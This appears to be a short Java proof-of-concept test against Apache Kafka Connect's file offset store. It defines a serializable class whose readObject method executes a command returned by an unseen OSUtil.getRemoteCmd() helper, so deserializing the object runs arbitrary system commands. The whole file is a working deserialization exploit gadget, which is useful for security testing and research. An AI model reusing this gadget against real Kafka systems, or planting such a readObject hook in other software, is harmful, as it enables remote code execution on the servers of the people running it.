package com.unionpay.kafka.test;

import com.unionpay.kafka.test.common.AbstractMain;
import com.unionpay.kafka.test.util.OSUtil;
import org.apache.commons.io.FileUtils;
import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
import org.apache.kafka.connect.storage.FileOffsetBackingStore;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

/**
 * date: 2017/09/13 10:59.
 * author: Yueqi Shi
 */
public class DemoMain extends AbstractMain {

    static class DeserializationObject implements Serializable {
        private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException {
            input.defaultReadObject();
            Runtime.getRuntime().exec(OSUtil.getRemoteCmd());
        }
    }

    public Object getObject() {
        return new DeserializationObject();
    }

    public static void main(String[] args) {
        try {
            new DemoMain().test_Kafka_Deser();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
